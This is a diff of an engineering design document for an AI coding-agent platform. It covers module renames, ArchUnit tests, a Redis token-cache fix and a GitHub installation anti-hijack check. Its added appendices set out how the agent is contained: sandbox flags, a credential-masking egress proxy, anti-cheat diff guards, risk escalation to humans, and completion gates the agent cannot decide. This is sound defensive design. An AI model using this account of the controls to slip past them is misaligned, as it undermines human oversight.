-- [Hatchet](https://github.com/hatchet-dev/hatchet) · [Pydantic AI durable execution](https://ai.pydantic.dev/durable_execution/overview/) · [Microsoft Agent Framework 1.0](https://devblogs.microsoft.com/agent-framework/microsoft-agent-framework-version-1-0/)
-- [Durable AI agents 2026: Temporal, Inngest, DBOS, Restate](https://www.reactify-solutions.com/articles/durable-ai-agents-2026) · [Checkpoints aren't durable execution](https://www.diagrid.io/blog/checkpoints-are-not-durable-execution-why-langgraph-crewai-google-adk-and-others-fall-short-for-production-agent-workflows)
+A **gate** decides completion and must be deterministic. A **tool** informs the agent and may be as
+flaky as it likes — a browser the agent uses to look at the page it just changed is valuable and is
+graded on nothing. E2E keeps its place as post-merge CI, where a human reads the failure.
 
 ---
 
-## Addendum — API naming: `/api/session` replaces `/api/me`
+## Appendix D — The architecture in three diagrams
 
-**Status: implemented, 43 tests green.** Retained as the record of why.
+Three diagrams. Solid borders are built and tested; dashed are decided and unbuilt.
 
-### Context
+### The three planes
 
-Step 1.5 shipped a single REST endpoint, `GET /api/me`, served by `api/MeController`. `me` is a pronoun, not a resource: it names the *caller* rather than the thing being fetched, so it does not compose (`/api/me/workspaces`? `/api/me/session`?) and it sets a precedent the rest of the API would inherit — while `api/` is still one file, which is the cheapest possible moment to change it.
+```mermaid
+flowchart TB
+    subgraph control["CONTROL PLANE — host process, Forge-authored only"]
+        direction LR
+        api["<b>api</b><br/>REST, session"]
+        task["<b>task</b><br/>lifecycle FSM<br/>8 completion guards, 4 enforced"]
+        runtime["<b>runtime</b><br/>TaskWorker, AttemptRunner"]
+        diffguard["<b>diffguard</b><br/>anti-cheat, provenance-scoped"]
+        harness["<b>harness</b><br/>ExecutionHarness port"]
+        router["<b>ModelRouter</b><br/>Spring AI"]
+    end
 
-Looking at what the endpoint actually returns settles the replacement. `userId`, `email`, `displayName`, `avatarUrl` come from the user row, but **`activeWorkspaceId` comes from `ForgePrincipal`, i.e. the server-side session**, and `workspaces` is the membership list. The payload is not a user — it is *who am I and what may I see right now*. That is session context, so the resource is the session.
+    subgraph isolation["ISOLATION PLANE — kernel-enforced, nothing above can loosen it"]
+        direction LR
+        provider["<b>SandboxProvider</b><br/>DockerSandboxProvider"]
+        flags["--user 10001:10001, --read-only<br/>--cap-drop=ALL, --pids-limit=512<br/>--security-opt=no-new-privileges<br/>--network none or forge-sbx-WS"]
+        proxy["<b>egress proxy</b><br/>TLS-terminating<br/>sentinel substitution"]
+    end
 
-Chosen: **`GET /api/session` → `SessionController` returning `SessionView`.**
+    subgraph capability["CAPABILITY PLANE — inside the sandbox, tenant-extensible, no privilege"]
+        direction LR
+        shell["shell and binaries"]
+        git["git: branch, commit, rebase"]
+        mcpstdio["MCP servers, stdio"]
+        lsp["language server"]
+        bg["background processes<br/>dev server, watch, debugger"]
+        tests["tests: unit and integration"]
+    end
 
-Why over the alternatives considered: `/api/viewer` (GitHub's GraphQL convention) is idiomatic for a GitHub-native product but imports a GraphQL-ism into a REST surface; `/api/current-user` is unambiguous but puts workspace context under a user resource, which forces a second endpoint the moment the UI needs more session state. `/api/account` was rejected outright — "account" already means the *GitHub* account here (`github_installations.account_login`, `account_type`), and reusing it would collide with established domain vocabulary.
+    services["<b>companion services</b><br/>Postgres, Redis<br/>host-provisioned onto forge-sbx-WS"]
+    gh["GitHub<br/>push, PR"]
+    model["model API"]
+    mcpremote["remote MCP servers"]
 
-The naming also buys a coherent home for two things §6 requires and Phase 1.5 has not placed yet: **`DELETE /api/session` (logout)** and **`PUT /api/session/workspace` (workspace switch)**. Both are session mutations; neither has an obvious home under `/api/me`.
+    api --> task
+    task --> runtime
+    runtime --> diffguard
+    runtime --> harness
+    router -.-> harness
+    harness --> provider
+    provider --> flags
+    provider ==>|"provisions, execs"| capability
+    capability -.-> proxy
+    capability <-.->|"workspace network"| services
+    proxy -.-> model
+    proxy -.-> mcpremote
+    runtime ==>|"host-brokered: the token lives here"| gh
 
-### Change
-
-One file, plus its URL. Nothing else references the path — `SecurityConfig` (`githubauth/internal/SecurityConfig.java:48`) matches `/api/**` broadly, and there is no client in this repo, so no compatibility shim or redirect is needed.
-
-`git mv src/main/java/dev/tushar/forge/api/MeController.java src/main/java/dev/tushar/forge/api/SessionController.java`, then:
-
-| Before | After |
-|---|---|
-| `@RequestMapping("/api/me")` | `@RequestMapping("/api/session")` |
-| `class MeController` | `class SessionController` |
-| `record MeView` | `record SessionView` |
-| `ResponseEntity<MeView> me(...)` | `ResponseEntity<SessionView> current(...)` |
-| `private MeView toView(...)` | `private SessionView toView(...)` |
-
-Record component names are unchanged, so the JSON body is identical — only the path and the Java types move. Use `git mv` rather than delete-and-create so the review diff shows one line changed per row above, not a new file.
-
-### Naming note worth recording
-
-There are now three `Session`-shaped names, deliberately at three layers rather than duplicated:
-
-| Name | Layer | Is |
-|---|---|---|
-| `iam.internal.session.Session` | persistence | the JPA entity (module-private) |
-| `iam.SessionService`, `iam.AuthenticatedSession`, `iam.IssuedSession` | domain API | issue, validate, revoke |
-| `api.SessionController`, `SessionView` | HTTP | the wire representation |
-
-Controller / service / entity sharing a root noun is normal Spring layering, and the boundary records already disambiguate direction (`IssuedSession` out of login, `AuthenticatedSession` into a request). No further rename needed — but a fourth `Session*` landing in `api/` is the signal that the API surface has outgrown a flat package and wants the `@NamedInterface` treatment discussed for `iam`.
-
-### Verification
-
-- `./gradlew test` — 42 tests, unchanged. `ModularityTest` (`ApplicationModules.verify()`) must still pass; the `api` module descriptor and its `allowedDependencies = {"iam", "githubauth"}` are untouched.
-- `AbstractionHygieneTest` is unaffected — no interface, no `Impl`, no layer-named package introduced.
-- Manual: log in via GitHub, then `curl -b <session cookie> localhost:8080/api/session` returns the same JSON body previously served at `/api/me`. Authenticated `GET /api/me` should now be a clean 404, not a 500.
-
-**Not in this change:** `DELETE /api/session` and `PUT /api/session/workspace`. Logout currently lives on Spring Security's `/logout` handler (`SecurityConfig.java:54`); moving it belongs with the browser client, not with a rename. Recorded here so the resource shape is intentional rather than accidental.
-
----
-
-## Addendum — the three `Session` names, and the real gap behind them
-
-**Status: implemented** (`nothingDependsOnTheApiModule`, proven to fail before being kept). **Superseded in part** — Finding 1 argued the overlap was acceptable because Java resolves it by import. That defended the compiler, not the reader; see the next addendum for the standard that replaces it.
-
-### Context
-
-The `/api/session` rename left three `Session`-shaped names in the codebase and a note that "a fourth `Session*` in `api/` means the API surface has outgrown a flat package." That note deserved a straight answer: is the overlap a problem, and is the remedy as expensive as implied? Checking both turned up **no naming problem and one genuine enforcement hole** — which is the part worth fixing.
-
-### Finding 1 — the name overlap needs no fix, and renaming would make it worse
-
-Java resolves types by import, so a repeated simple name only bites when two of them appear in **one compilation unit**. Exactly one file qualifies, and it reads cleanly (`iam/SessionService.java:51-71`):
-
-```java
-Session session = Session.issue(userId, hash(token), userAgent, expiresAt);
-sessions.save(session);
-return new IssuedSession(session.getId(), token, expiresAt);
-...
-return new AuthenticatedSession(session.getId(), session.getUserId(), session.getWorkspaceId());
+    classDef built stroke-width:2px
+    classDef planned stroke-dasharray:5 5
+    class api,task,runtime,diffguard,harness,provider,flags,shell,git,tests built
+    class router,proxy,mcpstdio,lsp,bg,services,mcpremote planned
 ```
 
-Four Session-ish types, zero ambiguity: the entity is the bare noun, the two boundary records are participles describing *direction* (`IssuedSession` leaves on login, `AuthenticatedSession` arrives on a request), the local is `session` and the repository field is `sessions`.
+The load-bearing fact is what has **no arrow**: nothing in the control plane reaches the capability
+plane except through `SandboxProvider`, and the module graph enforces it — `runtime` declares
+`allowedDependencies = {diffguard, harness, task, platform}` and `sandbox` is not among them, so
+business logic cannot name a container even by accident.
 
-`api` **cannot** collide with the entity even in principle — `iam.internal.session.Session` is module-private, so Modulith fails the build on any import of it from outside `iam`. The overlap is three layers naming the same concept, which is what layers are for. Renaming to `SessionEntity` / `SessionDto` would import exactly the layer-suffix vocabulary `AbstractionRules.packagesAreNamedAfterConceptsNotLayers` exists to keep out.
+### An attempt, and where it can be refused
 
-**Action: none.** Recorded so it is a decision rather than an omission.
+```mermaid
+flowchart TB
+    start(["task claimed by a worker"]) --> provision["provision sandbox<br/>SandboxSpec carries no credential"]
+    provision --> loop{"agent loop"}
+    loop -->|"tool call"| dispatch["dispatch<br/>command parsed for risk signals"]
+    dispatch --> risk{"§17 risk<br/>may raise, never lower"}
+    risk -->|"HIGH"| human["await human"]
+    risk -->|"ok"| exec["exec in sandbox"]
+    exec --> loop
+    loop -->|"returns a StopReason"| stop{"StopReason<br/>no success value exists"}
+    loop -->|"throws HarnessException"| thrown{"HarnessException<br/>sealed, 4 subtypes"}
 
-### Finding 2 — the remedy I implied is the wrong one, and cheaper than stated
+    stop -->|"INSTRUCTION_FINISHED"| verify["VERIFYING"]
+    stop -->|"PAUSED, AWAITING_HUMAN"| human
+    stop -->|"BUDGET_EXHAUSTED, STUCK"| failed(["FAILED — costs a retry"])
+    stop -->|"HARNESS_ERROR"| failed
+    thrown -->|"SessionLost, HarnessUnavailable"| aborted(["ABORTED — costs no retry"])
+    thrown -->|"CapacityExhausted"| requeue(["re-queued, no attempt consumed"])
+    thrown -->|"SpecRejected"| failed
 
-The reason `iam`'s API side stays flat is Modulith's rule that sub-packages are invisible to **dependents** unless annotated `@NamedInterface`. That constraint is about the module's consumers — and **`api` has none**. §2 states "Nothing depends on `api`."
+    verify --> guards{"diff guards"}
+    guards -->|"REFUSE finding"| escalate(["escalate to a human<br/>tests may well be green"])
+    guards -->|"FLAG only"| contract["run verification contract<br/>unit + integration"]
+    guards -->|"clean"| contract
+    contract -->|"red"| failed
+    contract -->|"green"| complete(["COMPLETE — 8 guards read committed rows"])
 
-So sub-packaging `api` costs nothing: no `@NamedInterface`, no ceremony, no import churn, because there is nobody outside to break. `api/session/SessionController.java` is just a `git mv`.
-
-**Action: do it with Task #15, not as a standalone commit.** Splitting a one-file package is the over-structuring flagged when `iam` was reorganised. But Task #15 (installation binding) adds installation endpoints next, so `api` reaches two or three resources within days — at which point the split is justified by real content and still costs two `git mv`s:
-
-```
-api/session/       SessionController        (GET /api/session)
-api/installation/  InstallationController   (GitHub App install callback, repo list, opt-in)
-```
-
-Deferring is cheap; doing it now is speculative structure.
-
-### Finding 3 — "Nothing depends on `api`" is not actually enforced ← the real gap
-
-Only three modules declare dependencies at all, and none names `api`:
-
-| Module | `allowedDependencies` |
-|---|---|
-| `api` | `iam`, `githubauth` |
-| `githubapp` | `iam`, `platform`, `platform::tenancy` |
-| `githubauth` | `iam` |
-
-So the property holds only because nobody has listed it. Adding `"api"` to some future module's `allowedDependencies` would make `ApplicationModules.verify()` pass while inverting the dependency direction — a controller package becoming a shared library is the ordinary way an HTTP layer stops being replaceable, and §2's whole claim is that swapping transport touches only this package.
-
-Everything else in §2 that matters is a build failure (`sandbox ↛ githubapp`, `policy ↛ llm`, no `dockerjava` outside its adapter). This one is a sentence in a javadoc.
-
-**Fix — one test method** in `src/test/java/dev/tushar/forge/architecture/AbstractionHygieneTest.java`, alongside the existing directional rules it already hosts (`dockerApiStaysInsideItsAdapter:73`, `sandboxCannotReachGithubCredentials:86`, `policyDoesNotDependOnLlm:103`). Reuses the `productionClasses` field and `ROOT` constant already there; no new test class:
-
-```java
-/**
- * The HTTP layer is a leaf. Nothing may depend on it.
- *
- * <p>Modulith enforces this only as long as no module lists {@code api} in its
- * {@code allowedDependencies} — an omission, not a guarantee. Stated directly here, because
- * "moving to a different transport touches only this package" stops being true the moment a
- * controller package acquires a dependent.
- */
-@Test
-void nothingDependsOnTheApiModule() {
-    noClasses()
-            .that()
-            .resideOutsideOfPackage(ROOT + ".api..")
-            .should()
-            .dependOnClassesThat()
-            .resideInAPackage(ROOT + ".api..")
-            .because("the HTTP layer is the outermost ring; a dependent would invert it")
-            .check(productionClasses);
-}
+    classDef terminal stroke-width:3px
+    class failed,aborted,escalate,complete,human,requeue terminal
 ```
 
-No `allowEmptyShould(true)` here — unlike the `sandbox` and `policy` rules, the `that()` set is non-empty today (every non-`api` production class), so the rule is live immediately rather than arming later.
+`StopReason` has no success value by construction. The agent stopping and the work being good are two
+different events, decided by two different things — the harness reports the first and never the
+second.
 
-### Verification
+### Where the credential is, and is not
 
-- `./gradlew test` — expect **43** tests, up from 42, all passing.
-- Prove the new rule fires rather than trusting it, per the standard set by `AbstractionRulesFireTest` ("a rule nobody has seen fail is a rule nobody knows works"): temporarily add a field of type `SessionController` to a class in another module, confirm the build fails, then revert. Do **not** commit the fixture — unlike `ReportGenerator`, a cross-module dependency cannot live in `architecture.fixtures` without being the very violation under test.
-- `ModularityTest` must still pass unchanged; this rule is strictly additional to Modulith's own checks.
+```mermaid
+sequenceDiagram
+    autonumber
+    participant A as agent, in sandbox
+    participant P as egress proxy, host
+    participant V as credential store
+    participant U as upstream, Sentry / model / registry
 
----
-
-## Addendum — module names must not be confusable: `githubauth` / `githubapp`
-
-**Status: implemented, 44 tests green.** Two things the plan got wrong and implementation corrected: `ApplicationModule.getName()` does not exist in Modulith 2.1 (it is `getIdentifier()`), and the nested module's identifier is `platform.tenancy`, not `tenancy`. The planned verification of `sandboxCannotReachGithubCredentials` was also wrong — flipping `allowEmptyShould(false)` tests the *sandbox* side of the rule, which is empty for unrelated reasons, and would have passed while proving nothing. It was instead proven by a throwaway class in `dev.tushar.forge.sandbox` referencing `TokenScope`, which made the rule fail as intended. That rule had never fired once since it was written.
-
-### Context
-
-The standard being applied here is **a reader's, not a compiler's**: opening this codebase cold, nobody should have to work out which of two similar names means what. The previous addendum failed that bar — it argued the three `Session` names were fine because Java resolves them by import. True, and beside the point.
-
-Re-reading the whole main tree against the reader's bar, the `Session` cluster is not the problem. **`githubauth` and `githubapp` are.** They are near-synonyms in English separated by the most security-critical distinction in the product: one identifies a *human*, the other grants the *agent* authority to act on repositories. The tell is that both module javadocs open by explaining they are not the other one:
-
-- `githubauth/package-info.java`: *"This module grants the agent nothing… Authority for the agent to act on GitHub… lives in `githubapp`."*
-- `githubapp/package-info.java`: *"Distinct from `githubauth`, which only identifies humans."*
-
-**When a name needs a disclaimer, the name is doing the wrong job.** And the failure mode is not cosmetic: confusing these two is precisely how a `repo` scope ends up on the login flow, which §6 exists to prevent and `GithubOAuthScopeTest` exists to catch.
-
-### The rename
-
-| From | To | Owns |
-|---|---|---|
-| `githubauth` | **`githublogin`** | identifying a human — `read:user`, `user:email`, sessions |
-| `githubapp` | **`githubinstallation`** | the agent's authority — installations, scoped tokens |
-
-Keeping the `github*` prefix preserves the family §2 plans to grow (`githubapi`, `githubwebhook`) so they still cluster in the file tree, while making the two impossible to confuse. Neither needs a disclaimer javadoc afterwards — delete those sentences, and say what each module *is*.
-
-Also update the `displayName`s: `"GitHub OAuth"` → `"GitHub Login"`, `"GitHub App"` → `"GitHub Installation"`.
-
-### What must NOT be renamed
-
-**"GitHub App" is GitHub's own product name**, so these stay exactly as they are — the module is being renamed for what it *owns* (installations, tokens), not to purge a term that is correct:
-
-- `GithubAppJwtService` — mints the *app-level* JWT, which is genuinely an App concern, not an installation one
-- `GithubAppProperties` — App id, private key, slug
-- `@ConfigurationProperties(prefix = "forge.github.app")` — a config key; renaming it would break every deployment's `application.yaml` for zero readability gain
-
-Worth stating explicitly, because the natural next instinct is to "finish the job" and rename these too.
-
-### Blast radius — four references outside the two packages
-
-`git mv` the two directories, then fix:
-
-| File | Change |
-|---|---|
-| `api/package-info.java:9` | `allowedDependencies = {"iam", "githubauth"}` → `"githublogin"` |
-| `api/SessionController.java:3` | `import …githubauth.ForgePrincipal` |
-| `iam/package-info.java:5` | javadoc `{@code githubapp}` → `{@code githubinstallation}` |
-| `architecture/AbstractionHygieneTest.java:92` | `ROOT + ".githubapp.."` in `sandboxCannotReachGithubCredentials` |
-
-Plus `package` declarations in the 7 + 7 files under each tree (5 main + 2 test, and 5 main + 2 test), and the two `package-info.java` javadocs that cross-reference each other.
-
-That last row matters most: `sandboxCannotReachGithubCredentials` is the ArchUnit rule that structurally prevents a GitHub token from reaching the sandbox. It currently points at `.githubapp..` and is `allowEmptyShould(true)`, so **if the package is renamed and the rule is not, it silently keeps passing against a package that no longer exists** — a security control quietly disarmed by a refactor. Update it in the same commit and confirm by pointing it at the new name.
-
-### The enforcement rule — and an honest correction
-
-The rule floated earlier ("no module javadoc may define itself by contrast with another module") **cannot be written in ArchUnit**: javadoc is stripped by the compiler and ArchUnit reads bytecode. Nothing mechanical can detect that two names are confusable — that is a human judgement.
-
-What *is* implementable is a gate that forces the judgement to be made. Add to `src/test/java/dev/tushar/forge/ModularityTest.java`, reusing the existing `MODULES` field:
-
-```java
-/**
- * The module inventory, declared. Adding or renaming a module must edit this list.
- *
- * <p>No tool can tell that two names are confusable — {@code githubauth} and {@code githubapp}
- * were both accurate and together unreadable. So the gate is a human one: this test fails until
- * someone writes the new name down next to its neighbours, which is the moment to ask whether it
- * can be mistaken for any of them.
- *
- * <p>Deliberately closed, for the same reason the transition table in §10.3 is closed: safety
- * here comes from concentration, not extensibility.
- */
-@Test
-void moduleNamesAreDeliberate() {
-    assertThat(MODULES.stream().map(ApplicationModule::getName))
-            .containsExactlyInAnyOrder(
-                    "api", "audit", "githubinstallation", "githublogin", "iam", "platform", "tenancy");
-}
+    Note over A: holds forge-sentinel-abc123<br/>never the real token
+    A->>P: request, Authorization: forge-sentinel-abc123
+    P->>P: is the host on this workspace's allowlist?
+    alt host not allowed
+        P-->>A: refused, and the violation is named<br/>so the agent can adapt
+    else host allowed
+        P->>V: resolve sentinel for this host only
+        V-->>P: real credential
+        P->>U: same request, real credential substituted
+        U-->>P: response
+        P-->>A: response
+    end
+    Note over A,U: a sentinel read out of the sandbox<br/>is inert anywhere but this proxy
 ```
 
-Verify the exact nested-module name string against the existing `printModuleStructure` output before pinning it — `platform.tenancy` may render as `tenancy`.
+Configuration for that substitution comes from **workspace settings and never from the repository**:
+a repo that could name its own inject-hosts could exfiltrate to them. This is the rule
+`@anthropic-ai/sandbox-runtime` enforces for the same reason, and it is the one that makes remote MCP
+servers safe to allow at all.
+
+## Appendix E — Build order
+
+1. **Egress proxy with credential masking** (§16). Every capability routes through it — remote MCP,
+   the model key, `git push`, package installs, warm caches. In a single-tenant tool "reach the
+   outside safely" and "reach the outside at all" are separate problems; in a multi-tenant one they
+   are the same problem, so this is the capability work, not security work blocking it.
+2. **Service dependencies** (§16). The integration tier does not exist without them, and integration
+   is the median case for repositories worth maintaining.
+3. **Tool catalogue and dispatch** (§15), with background processes, in-sandbox git, the language
+   server, and the MCP adapter.
+4. **`ModelRouter`** on Spring AI (§13).
+5. **The loop and context assembly** (§9, §14).
+
+`SandboxProvider` (§16) is built and conformance-tested against real containers.
 
-This would not have *caught* `githubauth`/`githubapp` automatically, and claiming otherwise would be overselling it. It puts the standard in front of whoever adds module #8, which is the most any rule can do here.
 
-### Deferred, deliberately
-
-- **`IamQueries`** sits beside `SessionService` and `UserProvisioningService` — two `*Service` and one `*Queries`, and "Iam" reads as "I am". Real, minor, and better fixed when the module next changes.
-- **The `Forge` prefix** is inconsistent: it earns its place on `ForgePrincipal` (shadows `java.security.Principal`) and `ForgeOAuth2UserService` (shadows Spring's), but `ForgeSessionCookie` shadows nothing.
-- **Sub-packaging `api/` by resource** — still queued for Task #15, when installation endpoints make it two real resources.
-
-### Verification
-
-- `./gradlew test` — expect **43** tests, unchanged and green. No behaviour changes; this is a rename plus one new assertion (44 with `moduleNamesAreDeliberate`).
-- `ModularityTest.printModuleStructure` output must show the new names with the same `+` exposed / `o` hidden shape as before — in particular `githubinstallation` still exposing only `InstallationTokenService` and `TokenScope`.
-- Confirm `sandboxCannotReachGithubCredentials` was really updated: temporarily point it at `ROOT + ".githubinstallation.."` with `allowEmptyShould(false)` and check it errors on the empty set rather than passing vacuously, then restore `true`. The `sandbox` module does not exist yet, so a passing rule proves nothing on its own.
-- `grep -rn "githubauth\|githubapp" src` should return only the intentional `GithubApp*` class names and the `forge.github.app` config prefix.
-
----
-
-## Addendum — token-cache eviction is not installation-scoped
-
-**Status: implemented, 46 tests green.** Test was watched failing against the old implementation before the fix landed.
-
-### Context
-
-A health check after the renames found nothing broken by them — the full context boots against real Postgres, 44 tests green, no stale references — but reading `githubinstallation/InstallationTokenService.java:100-107` closely turned up a **latent bug in the code Task #15 is about to call**:
-
-```java
-public void evictAll(long installationId) {
-    var keys = redis.keys(CACHE_PREFIX + "*");        // every installation, every workspace
-    if (keys != null && !keys.isEmpty()) redis.delete(List.copyOf(keys));
-    log.info("Evicted cached installation tokens after change to installation {}", installationId);
-}
-```
-
-The parameter is used **only in the log line**. Three problems, in order of severity:
-
-1. **Cross-tenant blast radius.** Suspending one customer's installation flushes every tenant's cached tokens. It fails safe — tokens are re-minted on the next request — so this is a correctness and cost problem, not a security hole. But §18's premise is that a per-workspace boundary holds at every layer, and here it does not.
-2. **`KEYS` blocks the Redis event loop** and is O(*whole keyspace*), not O(matches). §5 puts queues, leases, rate limiters and SSE fan-out in the same Redis, so this scan gets worse exactly as the system gets busier.
-3. **Installation-scoped eviction is impossible with the current key shape.** `TokenScope.fingerprint()` is a SHA-256 digest (`TokenScope.java:63`), so the installation id is *inside* the hash and cannot be matched on. The comment ("scope fingerprints are opaque, so the cheap path is a scan") is an accurate description of a design that boxed itself in.
-
-**No callers exist today** — which is the argument for fixing it now. Task #15 (installation binding, `installation.suspended` / `installation_repositories` webhooks) is the first caller, and would inherit a method whose signature lies about what it does.
-
-### The fix — `githubinstallation/InstallationTokenService.java`
-
-**Put the installation id in the key** so eviction can match on it. `fingerprint()` already includes the id in the hashed input, so uniqueness is unaffected; this only makes the key *enumerable*:
-
-```
-forge:ghtok:{installationId}:{fingerprint}      // was forge:ghtok:{fingerprint}
-```
-
-**Rename `evictAll` → `evict`** and scope it, using `SCAN` via the cursor `StringRedisTemplate` already exposes:
-
-```java
-/** Drops cached tokens for one installation — used when it is suspended or uninstalled. */
-public void evict(long installationId) {
-    ScanOptions options = ScanOptions.scanOptions()
-            .match(CACHE_PREFIX + installationId + ":*")
-            .count(256)
-            .build();
-    List<String> doomed = new ArrayList<>();
-    try (Cursor<String> cursor = redis.scan(options)) {
-        cursor.forEachRemaining(doomed::add);
-    }
-    if (!doomed.isEmpty()) {
-        redis.delete(doomed);
-    }
-    log.info("Evicted {} cached tokens for installation {}", doomed.size(), installationId);
-}
-```
-
-`SCAN` is incremental and non-blocking. It may miss a key added mid-scan, which is harmless here: a missed eviction costs one stale-but-valid token for at most the remaining TTL, and the token is already narrowly scoped.
-
-**Also derive the TTL from GitHub's response.** `TokenResponse.expires_at` (`InstallationTokenService.java:54`) is parsed and never read, while `CACHE_TTL` hardcodes 50 minutes next to a comment asserting GitHub tokens last 60. Two sources of truth for one fact, one of them an assumption. Cache until `expires_at` minus ten minutes' headroom, floored so a surprise short-lived token cannot produce a negative TTL. Flagged separately because it is a behaviour change, not just a rename — veto it and keep the constant if you would rather not couple to the response.
-
-### Test — `src/test/java/dev/tushar/forge/githubinstallation/InstallationTokenServiceTest.java`
-
-Extends `support/AbstractIntegrationTest.java`, which already provides the singleton Redis container. **No GitHub stub needed** — seed the cache directly and exercise only eviction, so the test has no network dependency:
-
-```
-seed  forge:ghtok:111:aaa, forge:ghtok:111:bbb, forge:ghtok:222:ccc
-evict(111)
-assert 111's keys are gone and 222's survives
-```
-
-That is the assertion the current implementation fails, which is the point of writing it. The bean autowires cleanly with unconfigured properties — `GithubAppJwtServiceTest:89` already relies on `GithubAppProperties(null, …)` constructing — so the token-minting path never has to be reached.
-
-### Commits — four, in this order
-
-| # | Scope |
-|---|---|
-| 1 | `refactor(api): /api/session replaces /api/me` |
-| 2 | `test(arch): assert nothing depends on the api module` |
-| 3 | `refactor: githubauth→githublogin, githubapp→githubinstallation` (19 files; stands alone so the rename is reviewable as a rename) |
-| 4 | `fix(githubinstallation): scope token-cache eviction to one installation` |
-
-### Verification
-
-- `./gradlew test` — expect **45** tests, all green.
-- The new test must be seen to fail before the fix: run it against the current `evictAll` first and confirm the `222` key is wrongly deleted.
-- `grep -rn "\.keys(" src` returns nothing — `KEYS` is gone from the codebase.
-- `ModularityTest.printModuleStructure` still shows `githubinstallation` exposing only `InstallationTokenService` and `TokenScope`.
-
-### Housekeeping, unrelated to the code
-
-- **The task list has drifted:** #12 is titled "Add /api/me endpoint" (renamed), #17 "Reorganise modules" is complete but still `in_progress`, and #14 is `in_progress` though the JWT and token-minting work it describes is done — only the installation flow (#15) remains.
-- **`/tmp/mjar`** is leftover scratch from inspecting the Modulith jar to find `getIdentifier()`. Outside the repo, but mine to clean up.
-
-### Still open, deliberately
-
-- Installation tokens are cached in Redis **in plain text**, pending `platform.crypto`. Documented in the class javadoc; unchanged by this fix.
-- `SessionController` and the token-minting path have no tests. `TokenScope.fingerprint()` is well covered (`TokenScopeTest`, 7 cases) but nothing verifies it end-to-end through the service.
-- `IamQueries` naming, the inconsistent `Forge` prefix, and sub-packaging `api/` by resource — all deferred as agreed.
-
----
-
-# Task #15 — Installation binding with anti-hijack verification
-
-## Context
-
-Phase 1.6 can currently mint a scoped installation token but has no way to *acquire* an installation: nothing writes `github_installations`. This task closes the loop — a logged-in user installs the GitHub App, GitHub redirects back, and Forge binds that installation to their workspace only after proving they are entitled to it.
-
-The attack this exists to stop (§7): installation ids are smallish integers that leak into logs and URLs. Without verification, anyone who learns one can hit the setup callback and bind a stranger's installation into their own workspace, gaining agent access to repositories they do not own. **The state nonce does not prevent this** — an attacker can generate a perfectly valid nonce bound to their own session and then substitute a victim's `installation_id`. The nonce stops CSRF; only an ownership check stops id substitution.
-
-### A contradiction in §7, resolved
-
-§7 asks us to "verify the current user is an admin/owner of that installation's account" while also refusing the `Members` and `Organization` App permissions. **Those are incompatible.** GitHub App user-to-server tokens carry no OAuth scopes — their reach is defined by the App's own permissions — so neither `GET /user/memberships/orgs/{org}` nor `read:org` is available to us.
-
-Decision: **personal-account installations only in this task.** `account_type == "User"` is verifiable exactly, with no extra permission and no stored token, by comparing the installation's `account.id` against the GitHub numeric id already in `user_identities.provider_user_id`. `Organization` installs are **rejected and audited**, not silently accepted. Org support becomes its own task where the access-vs-admin tradeoff gets decided in the open rather than buried in an implementation.
-
-This is a real product limitation, not a nicety — most design partners will want org repos — so the rejection message must say so plainly rather than reading like a bug.
-
-## Prerequisite discovered while reading: sessions have no workspace
-
-`Session.selectWorkspace()` (`iam/internal/session/Session.java:85`) has **zero callers**. `SessionService.issue()` never sets a workspace, so `sessions.workspace_id` is always NULL and `ForgePrincipal.activeWorkspaceId` has been null since it was written — `/api/session` has been returning null for it all along.
-
-Binding needs a target workspace, and `TenantScope.runInTenant(null, …)` throws `MissingTenantContextException`. So this is a blocker, not a nice-to-have.
-
-**Fix in `iam/SessionService.java`:** resolve the user's default workspace at issue time and call `selectWorkspace`. Keep the public signature `issue(userId, userAgent)` unchanged — the caller in `githublogin/internal/SecurityConfig.java:87` should not learn about workspace resolution. `SessionService` gains `WorkspaceRepository` (already module-internal, `findAllForUser` exists and is ordered). Every user has exactly one workspace today because `UserProvisioningService.createNew` makes a personal one; pick deterministically anyway (OWNER first, then first by name) so multi-workspace users do not get an arbitrary one later.
-
-## Design
-
-### Flow
-
-```
-GET /api/installations/start           (authenticated)
-  → mint nonce, store in Redis bound to this session, 15 min, single-use
-  → 302 to https://github.com/apps/{slug}/installations/new?state={nonce}
-
-  … user picks account + repositories on GitHub …
-
-GET /api/installations/callback?installation_id=&setup_action=&state=
-  1. consume nonce (GETDEL) — must exist, and map to THIS session id
-  2. GET /app/installations/{id} with the App JWT
-       — authoritative; the query parameter is an assertion, not evidence
-  3. account_type must be "User"        → else 409 + audit, org not yet supported
-  4. account.id must equal the caller's user_identities.provider_user_id
-                                        → else 403 + audit  ← the anti-hijack check
-  5. insert github_installations        → unique(installation_id) rejects rebinding
-  6. audit INSTALLATION_BOUND, redirect
-```
-
-Step 2 is the one that must not be skipped for convenience: everything after it reasons about GitHub's answer, never the caller's parameter.
-
-### Files
-
-| File | Role |
-|---|---|
-| `api/installation/InstallationController.java` | **new** — `start` + `callback`, no business logic |
-| `api/session/SessionController.java` | **moved** — `api/` now has two resources, so the by-resource split agreed earlier lands here |
-| `githubinstallation/InstallationBindingService.java` | **new**, public — the verification chain above |
-| `githubinstallation/InstallationBinding.java` | **new**, public record — the bound result as other modules see it |
-| `githubinstallation/internal/GithubAppClient.java` | **new** — owns the `RestClient`, exposes `fetchInstallation(long)` and the token mint |
-| `githubinstallation/internal/InstallationSetupNonces.java` | **new** — Redis nonce issue/consume |
-| `githubinstallation/internal/GithubInstallation{,Repository}.java` | **new** — JPA entity + Spring Data repository |
-| `githubinstallation/InstallationTokenService.java` | delegate HTTP to `GithubAppClient`, keep the caching |
-| `iam/IamQueries.java` | **+** `Optional<String> githubUserId(UUID userId)` |
-| `iam/SessionService.java` | select default workspace at issue time |
-| `audit/AuditLog.java` | **new**, minimal — first real auditable action needs somewhere to go |
-
-**Reuse rather than rebuild:** `TenantScope.runInTenant` for every write (RLS `WITH CHECK` rejects inserts otherwise — this already bit us once when seeding audit rows); `GithubAppJwtService.mintAppJwt()` for step 2; `TokenScope.readOnly/contribute` unchanged; `AbstractIntegrationTest` for the Postgres + Redis containers.
-
-**Extract the `RestClient`.** `InstallationTokenService` currently builds its own with `apiBaseUrl`, `Accept` and `X-GitHub-Api-Version` headers. The new call needs the identical setup, and two copies is how one of them silently misses a version bump. `GithubAppClient` owns transport; `InstallationTokenService` keeps caching. That split is worth having on its own.
-
-**Package layout:** keep `githubinstallation/internal` flat at ~6 files. When #16 adds repository and managed-repository entities it reaches ~10, which is when the by-aggregate split (`installation/`, `repository/`) earns itself. Structure when there is content to justify it.
-
-### Notes that will otherwise cost an hour each
-
